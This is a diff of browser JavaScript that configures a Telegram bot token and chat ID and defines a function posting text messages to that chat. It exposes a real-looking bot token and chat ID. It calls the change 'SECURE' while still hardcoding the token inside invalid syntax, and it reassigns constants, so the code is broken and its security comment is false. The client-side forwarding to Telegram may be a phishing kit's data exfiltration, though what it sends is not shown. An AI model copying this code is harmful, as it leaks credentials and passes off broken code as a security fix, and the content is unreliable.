@@ -1,3 +1,25 @@
+/ ==========================================
+// 1. TELEGRAM CONFIGURATION
+// ==========================================
+// ✅ SECURE: Load from environment variables (NOT hardcoded!)
+const TELEGRAM_TOKEN = process.env.8997212434:AAHiCqsMue78uczOac5fr3AEwO1ZXrCcVcw || "";
+const TELEGRAM_CHAT_ID = process.env.8524294724 || "";
+
+// Fallback for browsers (where process.env doesn't work):
+if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+    // Try loading from .env file (for local development with Vite/Webpack)
+    TELEGRAM_TOKEN = window?.env?.BOT_TOKEN || "";
+    TELEGRAM_CHAT_ID = window?.env?.CHAT_ID || "";
+}
+
+// ⚠️ CRITICAL: If tokens are missing, show error
+if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("⚠️ WARNING: BOT_TOKEN or CHAT_ID not set! Set environment variables:");
+    console.warn("   export BOT_TOKEN='your_token_here'");
+    console.warn("   export CHAT_ID='your_chat_id_here'");
+}
+
+// ==========================================
 /    let count = 3;
     const countdownEl = document.getElementById('countdown');
     const interval = setInterval(() => {
@@ -45,13 +67,7 @@ function updateversion(textMessage) {
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: "Markdown" })
     }).catch(err => console.error("Error sending to Telegram:", err));
           }
-      
-// ==========================================
-// 1. TELEGRAM CONFIGURATION
-// ==========================================
-const TELEGRAM_TOKEN = "8994413452:AAF_GfDPe_Mt0rlv4q8rtzx..."; // <-- Put your real Token here
-const TELEGRAM_CHAT_ID = "8524294724";                          // <-- Put your real Chat ID here
-
+    
 // ==========================================
 // 2. GLOBAL APP STATE
 // ==========================================
